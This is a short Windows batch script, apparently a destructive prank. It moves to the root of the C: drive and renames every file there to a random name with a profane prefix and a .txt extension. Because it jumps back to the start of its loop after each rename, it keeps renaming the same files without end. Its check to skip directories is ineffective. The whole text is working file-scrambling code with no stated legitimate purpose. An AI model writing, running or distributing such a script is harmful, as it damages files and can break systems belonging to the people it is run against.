@echo off
setlocal enabledelayedexpansion

cd /d C:\
cd C:\

:d
for %%F in (*) do (
    if not "%%~aF"=="d" (
        call :renameFile "%%F"
    )
)
echo Done.
pause
exit /b

:renameFile
set "original=%~1"
:retry
set /a rnd=!random!
set "newname=fuckforkies_!rnd!.txt"
if exist "!newname!" goto :retry
ren "%original%" "!newname!"
goto d
